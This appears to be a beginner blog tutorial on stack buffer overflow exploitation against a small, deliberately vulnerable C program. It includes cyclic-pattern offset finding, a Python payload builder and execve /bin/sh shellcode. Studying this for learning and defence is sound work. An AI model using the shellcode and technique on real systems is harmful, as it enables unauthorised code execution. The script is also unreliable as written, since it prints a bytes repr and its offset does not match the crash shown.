---
title: "Stack Buffer Overflow Exploitation: The Basics"
date: "2026-05-08"
excerpt: "A beginner-friendly guide to understanding and exploiting stack-based buffer overflows."
tags: ["exploit-dev", "buffer-overflow", "x86"]
author: "Security Researcher"
---

# Stack Buffer Overflow Exploitation: The Basics

Buffer overflows remain one of the most fundamental vulnerabilities in software security. In this post, we'll cover the basics of stack-based buffer overflows.

## Understanding the Stack

The stack grows downward in memory (from high to low addresses). When a function is called:

```
+------------------+ Higher addresses
|   Return Addr    |
+------------------+
|   Saved EBP      |
+------------------+
|   Local Vars     |
+------------------+
|   Buffer         |
+------------------+ Lower addresses
```

## Vulnerable Code

Consider this classic vulnerable program:

```c
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable(argv[1]);
    }
    return 0;
}
```

## Finding the Offset

We can use a cyclic pattern to find the exact offset to EIP:

```bash
$ pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5...

$ ./vuln $(pattern_create.rb -l 100)
Segmentation fault

$ dmesg | tail -1
[12345.678] vuln[1234]: segfault at 41346141
```

## Crafting the Exploit

```python
#!/usr/bin/env python3
import struct

# Offset to EIP
offset = 76

# Return address (pointing to our shellcode)
ret_addr = struct.pack("<I", 0xbffff7a0)

# NOP sled
nop_sled = b"\x90" * 16

# Shellcode (execve /bin/sh)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\xb0\x0b\xcd\x80"
)

payload = b"A" * offset + ret_addr + nop_sled + shellcode
print(payload)
```

## Modern Protections

Modern systems employ several protections:

- **ASLR**: Randomizes memory addresses
- **DEP/NX**: Prevents code execution on the stack
- **Stack Canaries**: Detect stack corruption
- **PIE**: Position Independent Executables

## Conclusion

Understanding buffer overflows is crucial for both offense and defense. While modern protections make exploitation harder, the fundamental concepts remain relevant.

> "To defeat your enemy, you must first understand them." - Sun Tzu (probably)

Happy hacking!
